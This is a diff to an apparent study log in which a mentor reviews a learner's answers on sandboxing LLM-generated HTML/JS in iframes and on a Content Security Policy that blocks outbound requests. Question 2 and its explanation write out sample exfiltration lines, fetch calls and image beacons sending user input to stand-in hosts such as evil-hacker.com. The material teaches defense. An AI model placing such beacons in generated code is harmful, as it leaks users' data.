@@ -195,3 +195,42 @@ In our `TaskRouter`, why did we configure the priority chain for `retrieval_qa` 
   2. **Essay (`essay_generation`)**: ~1,250 words (~1,800 tokens). On local hardware, 1,800 tokens at 30 tokens/sec takes **60 to 75 seconds** of continuous 100% GPU/Neural Engine computation, heating the machine and causing noticeable user wait times. In contrast, cloud models (Gemini Flash) stream at 100+ tokens/sec (~15 seconds), have vast context windows (1M+ tokens), and exhibit richer vocabulary and narrative pacing.
   3. **Attention KV Cache Growth**: During long generations, the KV cache grows in unified RAM. Cloud routing offloads compute while preserving local Ollama as a zero-cost, offline-safe fallback if API keys or internet are unavailable.
 - *Verified Mental Model:* Short interactive Q&A thrives on local edge compute; long-form generative synthesis prioritizes high-throughput cloud models with local fallback.
+
+---
+
+## Gate 7 — Sandboxed Artifact Generation & Defense-in-Depth Security
+
+### Question 1
+When rendering LLM-generated interactive HTML/JS calculators inside an `<iframe>`, why is specifying `sandbox="allow-scripts"` while strictly omitting `allow-same-origin` essential? What error does the browser's JavaScript engine raise if the generated script attempts to access `window.parent.document.cookie` or `window.parent.localStorage`?
+
+**User Answer:**
+> 1. On iframe we need JS scripts to interact and for dynamic response. If we don't allow JS it will only be a static page, so that is why we add `allow-scripts`. And we omit `allow-same-origin` for security purposes: if allowed, the iframe has direct access to the parent container, making the system vulnerable to prompt injection, etc.
+
+**Mentor Assessment:**
+- *What was right:* Accurately identified that `allow-scripts` is mandatory for client-side interactivity and calculators, and that omitting `allow-same-origin` is required to prevent the untrusted frame from accessing the parent container.
+- *What was incomplete:* Clarified the browser runtime mechanics and specific error:
+  - Omitting `allow-same-origin` assigns the iframe an opaque, unique origin: `origin: "null"`.
+  - Since `origin: "null"` does not match the parent origin (`http://localhost:3000`), the browser engine's Same-Origin Policy (SOP) blocks any inspection.
+  - If a script in the iframe attempts `window.parent.document.cookie` or `window.parent.localStorage`, the browser throws a runtime exception:
+    `DOMException: Blocked a frame with origin "null" from accessing a cross-origin frame.`
+- *Verified Mental Model:* `origin: "null"` creates an impenetrable vertical boundary between the child iframe and the parent DOM/storage.
+
+---
+
+### Question 2
+Even if access to `window.parent` is blocked by origin isolation, what prevents the generated script inside the iframe from exfiltrating sensitive calculation inputs to an external attacker server via `fetch('https://evil-hacker.com/steal?data=' + input)` or `<img src="https://evil-hacker.com/log?..." />`, and how does our Content Security Policy (CSP) header (`default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; connect-src 'none'; img-src data:;`) neutralize that threat?
+
+**User Answer:**
+> Not sure.
+
+**Mentor Explanation & Mental Model:**
+- *The Hidden Danger:* Origin isolation blocks *inward* access (the iframe reading parent data). But the iframe still possesses an active browser network stack! If a user enters proprietary startup metrics into an interactive calculator, a malicious or prompt-injected script could make an *outward* request:
+  1. `fetch('https://attacker-server.com/exfiltrate?data=' + encodeURIComponent(sensitiveMetrics))`
+  2. Or construct a tracking beacon: `new Image().src = 'https://attacker-server.com/ping?d=' + sensitiveMetrics`
+- *How CSP Neutralizes the Threat:*
+  - `connect-src 'none'`: Commands the browser engine to block 100% of outbound network traffic originating from `fetch()`, `XMLHttpRequest`, `WebSocket`, or `EventSource`. Any call fails immediately with a network policy violation.
+  - `default-src 'none'` & `img-src data:`: Strictly restricts image requests so the iframe cannot load external tracking beacons or ping external servers; it can only render inline base64 `data:` images.
+  - `script-src 'unsafe-inline'` & `style-src 'unsafe-inline'`: Permits the calculator's embedded math functions, event listeners, and CSS styles to execute smoothly without needing remote network dependencies.
+- *Verified Mental Model:* Two-way containment: `sandbox="allow-scripts"` blocks vertical privilege escalation into the parent app, while `CSP: connect-src 'none'` blocks horizontal data leakage to the public internet.
+
+
